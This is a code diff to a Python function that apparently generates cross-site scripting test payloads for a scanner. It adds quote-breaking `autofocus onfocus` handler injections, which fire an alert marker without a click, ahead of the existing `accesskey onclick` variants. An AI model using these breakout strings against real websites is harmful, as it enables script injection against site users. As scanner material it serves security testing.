@@ -2163,9 +2163,14 @@ def _attribute_shortcut_payloads(marker: str, quote: str) -> List[str]:
 
     The value is inside ``href='…'`` (or ``"…"``), so the first quote closes the
     attribute. The handler that follows is called with backticks: any further
-    ``'`` / ``"`` would end the attribute again. ``accesskey`` is what makes the
-    handler reachable on an element the user never clicks — the canonical link,
-    a preload, a stylesheet.
+    ``'`` / ``"`` would end the attribute again.
+
+    Labels are stripped before a payload is accepted, and ``<a href>`` is one of
+    the elements that loses them on its way into the accessibility tree, so
+    ``accesskey`` does not survive on it. ``autofocus`` does: the page focuses
+    the element itself, which fires ``onfocus`` without a click or a keystroke.
+    It is tried first for that reason; ``accesskey`` remains for the element a
+    label does not reach.
 
     Both readings of the leftover document are tried. The page's own closing
     quote may become a stray character before ``>``, or it may end the handler
@@ -2174,6 +2179,8 @@ def _attribute_shortcut_payloads(marker: str, quote: str) -> List[str]:
     """
     call = f"alert(`{marker}`)"
     return [
+        f"{quote}autofocus onfocus={call} x={quote}",
+        f"{quote}autofocus onfocus={quote}{call}{quote} x={quote}",
         f"{quote}accesskey={quote}x{quote}onclick={call}",
         f"{quote}accesskey={quote}x{quote}onclick={quote}{call}",
         f"{quote}accesskey={quote}x{quote}onclick={quote}{call}{quote} x={quote}",
